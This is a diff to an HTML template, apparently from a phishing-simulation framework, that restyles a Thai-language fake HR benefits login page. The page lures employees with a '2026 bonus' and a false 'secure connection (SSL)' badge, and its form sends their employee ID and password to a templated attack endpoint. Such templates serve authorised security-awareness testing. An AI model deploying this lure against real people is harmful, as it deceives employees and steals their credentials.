@@ -2,29 +2,93 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8">
-  <title>ระบบสวัสดิการพนักงาน - HR Portal</title>
-  <style>
-    body { font-family: 'Sarabun', sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .login-card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 350px; }
-    h2 { color: #2c3e50; text-align: center; }
-    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
-    button { width: 100%; padding: 10px; background: #3498db; border: none; color: white; border-radius: 4px; cursor: pointer; }
-    button:hover { background: #2980b9; }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ระบบสวัสดิการพนักงาน {{ attack.target.company }} | HR Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;500;600;700&display=swap" rel="stylesheet">
 </head>
-<body>
-  <div class="login-card">
-    <h2>เข้าสู่ระบบ HR Portal</h2>
-    <p style="font-size: 0.9em; color: #666; text-align: center;">โปรดใช้รหัสพนักงานและรหัสผ่านเพื่อดูโบนัสสวัสดิการ</p>
-    <form
-      id="hrLoginForm"
-      method="post"
-      action="{{ attack.scheme.components.first(name='hr_benefits_page').url }}"
-    >
-      <input type="text" id="employeeId" name="username" placeholder="รหัสพนักงาน" required>
-      <input type="password" id="password" name="password" placeholder="รหัสผ่าน" required>
-      <button type="submit">ดูโบนัสสวัสดิการปี 2026</button>
-    </form>
-  </div>
+<body style="margin:0; padding:1.5rem; box-sizing:border-box; font-family:'Sarabun', -apple-system, BlinkMacSystemFont, sans-serif; background:linear-gradient(135deg, #134e5e 0%, #2c3e50 50%, #3498db 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; color:#2c3e50;">
+
+  <main style="background:#ffffff; width:100%; max-width:420px; border-radius:14px; box-shadow:0 20px 50px rgba(15, 23, 42, 0.25); overflow:hidden;">
+
+    <header style="background:linear-gradient(135deg, #ff6b6b 0%, #ee5a52 50%, #f06595 100%); color:#ffffff; padding:1.75rem 1.5rem 1.5rem; text-align:center; position:relative; border-bottom:4px solid #ffd93d;">
+      <div style="width:64px; height:64px; background:#ffffff; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-size:1.5rem; font-weight:800; color:#ee5a52; margin-bottom:0.85rem; box-shadow:0 6px 16px rgba(0, 0, 0, 0.2); letter-spacing:0.5px;">HR</div>
+      <h1 style="margin:0 0 0.3rem 0; font-size:1.2rem; font-weight:600; text-shadow:0 1px 2px rgba(0, 0, 0, 0.15);">ระบบสวัสดิการพนักงาน</h1>
+      <div style="font-size:0.78rem; color:#fff5f5; letter-spacing:0.3px; opacity:0.95;">{{ attack.target.company }} HR Portal</div>
+    </header>
+
+    <div style="background:#fff7ed; border-left:4px solid #f59e0b; color:#92400e; padding:0.75rem 1.5rem; font-size:0.82rem; line-height:1.5;">
+      <strong>&#127881; Bonus 2026 พร้อมแล้ว!</strong> เข้าสู่ระบบเพื่อดูรายละเอียดสวัสดิการประจำปี
+    </div>
+
+    <section style="padding:1.5rem 1.75rem 1.75rem;">
+
+      <div style="background:#ecf0f1; border-left:3px solid #3498db; padding:0.75rem 1rem; border-radius:6px; font-size:0.85rem; color:#34495e; margin-bottom:1.4rem; line-height:1.55;">
+        โปรดเข้าสู่ระบบด้วย <strong>รหัสพนักงาน</strong> และ <strong>รหัสผ่าน</strong>
+        เพื่อดูรายละเอียดโบนัสและสวัสดิการประจำปี 2026
+      </div>
+
+      <form
+        id="hrLoginForm"
+        method="post"
+        action="{{ attack.scheme.components.first(name='hr_benefits_page').url }}"
+        style="margin:0;"
+      >
+        <div style="margin-bottom:1rem;">
+          <label for="employeeId" style="display:block; font-size:0.82rem; font-weight:600; color:#34495e; margin-bottom:0.4rem;">
+            รหัสพนักงาน <span style="color:#e74c3c;">*</span>
+          </label>
+          <input
+            type="text"
+            id="employeeId"
+            name="username"
+            placeholder="เช่น EMP-00001"
+            autocomplete="username"
+            required
+            style="width:100%; padding:0.7rem 0.9rem; border:1px solid #dcdfe1; border-radius:8px; font-size:0.95rem; font-family:inherit; color:#2c3e50; background:#f8f9fa; box-sizing:border-box; outline:none;"
+            onfocus="this.style.borderColor='#3498db'; this.style.background='#ffffff'; this.style.boxShadow='0 0 0 3px rgba(52, 152, 219, 0.15)';"
+            onblur="this.style.borderColor='#dcdfe1'; this.style.background='#f8f9fa'; this.style.boxShadow='none';"
+          >
+        </div>
+
+        <div style="margin-bottom:1.25rem;">
+          <label for="password" style="display:block; font-size:0.82rem; font-weight:600; color:#34495e; margin-bottom:0.4rem;">
+            รหัสผ่าน <span style="color:#e74c3c;">*</span>
+          </label>
+          <input
+            type="password"
+            id="password"
+            name="password"
+            placeholder="กรอกรหัสผ่าน"
+            autocomplete="current-password"
+            required
+            style="width:100%; padding:0.7rem 0.9rem; border:1px solid #dcdfe1; border-radius:8px; font-size:0.95rem; font-family:inherit; color:#2c3e50; background:#f8f9fa; box-sizing:border-box; outline:none;"
+            onfocus="this.style.borderColor='#3498db'; this.style.background='#ffffff'; this.style.boxShadow='0 0 0 3px rgba(52, 152, 219, 0.15)';"
+            onblur="this.style.borderColor='#dcdfe1'; this.style.background='#f8f9fa'; this.style.boxShadow='none';"
+          >
+        </div>
+
+        <button
+          type="submit"
+          style="width:100%; padding:0.85rem; background:linear-gradient(135deg, #3498db, #2980b9); color:#ffffff; border:none; border-radius:8px; font-size:0.98rem; font-weight:600; font-family:inherit; cursor:pointer; letter-spacing:0.3px; box-shadow:0 4px 10px rgba(52, 152, 219, 0.3); transition:transform 0.1s;"
+          onmouseover="this.style.boxShadow='0 8px 20px rgba(52, 152, 219, 0.45)'; this.style.transform='translateY(-1px)';"
+          onmouseout="this.style.boxShadow='0 4px 10px rgba(52, 152, 219, 0.3)'; this.style.transform='translateY(0)';"
+        >
+          &#127873; ดูโบนัสสวัสดิการปี 2026
+        </button>
+
+        <div style="text-align:center; margin-top:1rem;">
+          <a href="#" style="font-size:0.8rem; color:#7f8c8d; text-decoration:none;" onmouseover="this.style.color='#3498db'; this.style.textDecoration='underline';" onmouseout="this.style.color='#7f8c8d'; this.style.textDecoration='none';">
+            ลืมรหัสผ่าน?
+          </a>
+        </div>
+      </form>
+    </section>
+
+    <footer style="background:#f8f9fa; padding:0.9rem 1.75rem; border-top:1px solid #ecf0f1; text-align:center; font-size:0.72rem; color:#7f8c8d; line-height:1.55;">
+      <span style="color:#27ae60; font-weight:600;">&#128274; การเชื่อมต่อปลอดภัย (SSL)</span><br>
+      &copy; {{ attack.target.company }} HR Department &middot; ติดต่อ <a href="mailto:hr@company.com" style="color:#3498db; text-decoration:none;">hr@company.com</a>
+    </footer>
+
+  </main>
 </body>
 </html>
